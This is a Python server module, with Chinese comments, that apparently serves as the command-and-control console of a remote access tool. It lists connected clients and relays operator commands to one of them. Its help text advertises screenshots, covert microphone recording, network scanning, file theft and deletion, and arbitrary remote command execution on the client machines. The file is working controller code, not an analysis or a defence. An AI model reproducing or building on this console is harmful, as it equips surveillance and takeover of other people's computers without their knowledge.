# server/handler.py
import asyncio
from communication import send_data_with_header, receive_data_with_header
import os

# 定义 ANSI 颜色代码
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

async def list_clients(clients):
    """
    列出所有在线客户端
    :param clients: 客户端字典 {地址: (reader, writer)}
    """
    if not clients:
        return f"{Colors.WARNING}[INFO] 当前没有在线客户端{Colors.ENDC}"
    
    client_list = f"{Colors.OKGREEN}[INFO] 在线客户端：\n{Colors.ENDC}"
    for idx, client_address in enumerate(clients.keys(), start=1):
        client_list += f"  {Colors.OKBLUE}{idx}. {client_address}{Colors.ENDC}\n"
    return client_list

async def select_client(clients):
    """
    选择一个客户端
    :param clients: 客户端字典 {地址: (reader, writer)}
    """
    if not clients:
        print(f"{Colors.WARNING}[INFO] 当前没有在线客户端{Colors.ENDC}")
        return None, None, None

    while True:
        # 列出在线客户端
        print(await list_clients(clients))
        selected_client = input(f"{Colors.OKCYAN}[SERVER] 输入要操作的客户端序号（或输入 'exit' 返回主菜单）：\n> {Colors.ENDC}")

        if selected_client.lower() == "exit":
            return None, None, None

        # 检查输入是否有效
        try:
            selected_idx = int(selected_client) - 1
            if selected_idx < 0 or selected_idx >= len(clients):
                print(f"{Colors.FAIL}[ERROR] 无效的客户端序号，请重新输入{Colors.ENDC}")
                continue
            selected_address = list(clients.keys())[selected_idx]
            reader, writer = clients[selected_address]
            return reader, writer, selected_address
        except ValueError:
            print(f"{Colors.FAIL}[ERROR] 输入的不是有效的数字，请重新输入{Colors.ENDC}")

async def handle_client(reader, writer, clients):
    """
    处理新连接的客户端
    :param reader: asyncio.StreamReader
    :param writer: asyncio.StreamWriter
    :param clients: 客户端字典 {地址: (reader, writer)}
    """
    addr = writer.get_extra_info('peername')
    clients[addr] = (reader, writer)  # 将客户端添加到在线列表
    print(f"{Colors.OKGREEN}[INFO] 新客户端已连接：{addr}{Colors.ENDC}")

    try:
        while True:
            # 模拟心跳或保持连接
            await asyncio.sleep(0.01)
    except asyncio.CancelledError:
        print(f"{Colors.WARNING}[INFO] 客户端 {addr} 连接被取消{Colors.ENDC}")
    finally:
        # 客户端断开时移除
        if addr in clients:
            del clients[addr]
        writer.close()
        await writer.wait_closed()
        print(f"{Colors.FAIL}[INFO] 客户端 {addr} 已断开连接{Colors.ENDC}")

async def handle_command_loop(clients):
    while True:
        if not clients:
            print(f"{Colors.WARNING}[INFO] 当前没有在线客户端，等待连接...{Colors.ENDC}")
            await asyncio.sleep(5)
            continue

        reader, writer, addr = await select_client(clients)
        if reader is None:
            print(f"{Colors.OKCYAN}[INFO] 返回主菜单{Colors.ENDC}")
            continue

        command = input(f"{Colors.OKCYAN}[SERVER] 输入发送给客户端({addr})的命令（输入 'help' 查看可用命令，或输入 'exit' 断开连接）：\n> {Colors.ENDC}")
        
        if command.lower() == "exit":
            print(f"{Colors.WARNING}[INFO] 已断开客户端 {addr} 的连接{Colors.ENDC}")
            writer.close()
            await writer.wait_closed()
            if addr in clients:
                del clients[addr]
            continue

        if command.lower() == "help":
            # 显示美化后的命令帮助信息
            print(f"""
            {Colors.HEADER}╔════════════════════════════════════════╗
                         可用命令列表
            ╚════════════════════════════════════════╝{Colors.ENDC}
            {Colors.BOLD}{Colors.OKBLUE}📋 系统信息与工具：{Colors.ENDC}
              - {Colors.OKGREEN}info{Colors.ENDC}                          获取操作系统和主机信息
              - {Colors.OKGREEN}screenshot{Colors.ENDC}                   截屏并保存为图片（仅支持 Windows 和 macOS）
              - {Colors.OKGREEN}record <duration>{Colors.ENDC}             录音并保存为音频文件，<duration> 为录音时长（默认 5 秒）
              - {Colors.OKGREEN}scan_network{Colors.ENDC}                  扫描局域网内的在线设备

            {Colors.BOLD}{Colors.OKBLUE}📁 文件操作：{Colors.ENDC}
              - {Colors.OKGREEN}list <directory>{Colors.ENDC}              列出指定目录的内容，<directory> 默认为当前目录
              - {Colors.OKGREEN}create <file_path>{Colors.ENDC}            创建一个新文件，<file_path> 为文件路径
              - {Colors.OKGREEN}delete <file_path>{Colors.ENDC}            删除文件或文件夹，<file_path> 为路径
              - {Colors.OKGREEN}read <file_path>{Colors.ENDC}              读取文件内容，支持多种编码
              - {Colors.OKGREEN}upload <file_path>{Colors.ENDC}            上传文件到服务端，<file_path> 为本地文件路径
              - {Colors.OKGREEN}download <file_path>{Colors.ENDC}          从服务端下载文件，<file_path> 为保存路径

            {Colors.BOLD}{Colors.OKBLUE}🔧 系统命令：{Colors.ENDC}
              - {Colors.OKGREEN}cmd <system_command>{Colors.ENDC}          执行系统命令，<system_command> 为实际的系统命令，如 `dir` 或 `ls`

            {Colors.BOLD}{Colors.OKCYAN}❓ 帮助与退出：{Colors.ENDC}
              - {Colors.OKGREEN}help{Colors.ENDC}                          显示此帮助信息
              - {Colors.OKGREEN}exit{Colors.ENDC}                          退出当前客户端会话
            """)
            continue

        # 其他命令处理...
        await send_data_with_header(writer, command)
        response = await receive_data_with_header(reader)
        try:
            print(f"{Colors.OKCYAN}[CLIENT {addr}] 响应：\n{response.decode('utf-8')}{Colors.ENDC}")
        except UnicodeDecodeError:
            print(f"{Colors.FAIL}[ERROR] 无法解码客户端响应，可能是非文本数据：\n{response}{Colors.ENDC}")